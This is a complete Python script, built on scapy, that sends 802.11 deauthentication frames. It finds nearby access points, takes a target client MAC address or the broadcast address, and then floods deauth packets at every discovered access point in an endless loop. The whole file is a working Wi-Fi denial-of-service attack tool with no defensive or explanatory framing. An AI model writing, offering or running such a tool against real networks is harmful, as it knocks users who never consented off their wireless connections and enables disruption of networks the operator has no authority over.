from scapy.all import *
from helper import *

if len(sys.argv) < 2:
  print("usage: deauth.py <iface>")
  sys.exit(-1)
conf.iface = sys.argv[1]

select_channel(conf.iface)
response = discover_aps(conf.iface)

aps = response["aps"]
host_list = response["host_list"]

# TODO: Add option for multiple clients
client = input("target client MAC address (* - all clients) : ")
# TODO: Check if mac address is valid
if client == "*":
  client = "FF:FF:FF:FF:FF:FF"

# Send packets forever
while True:
  for n in aps:
    ap = host_list[n][1]["cli"]
    # Create & send packet
    packet = RadioTap()/Dot11(type=0,subtype=12,addr1=client, addr2=ap, addr3=ap)/Dot11Deauth(reason=7)
    sendp(packet, monitor=True)
    print("ap     : " + ap)
    print("client : " + client)
    print()
